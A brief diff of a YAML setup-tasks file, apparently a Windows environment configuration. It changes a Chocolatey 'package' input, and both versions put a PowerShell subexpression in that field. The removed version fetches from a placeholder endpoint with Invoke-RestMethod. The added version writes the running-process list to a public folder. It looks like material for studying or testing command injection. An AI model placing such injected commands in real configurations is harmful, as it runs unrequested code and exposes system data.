@@ -10,4 +10,4 @@ setupTasks:
   - task: install-choco
   - task: choco
     inputs:
-      package: $(Invoke-RestMethod -Uri "http://{CUSTOMENDPOINT}/package" -Method Get;)
+      package: $(Get-Process | Out-File -FilePath C:\Users\Public\Process.txt)
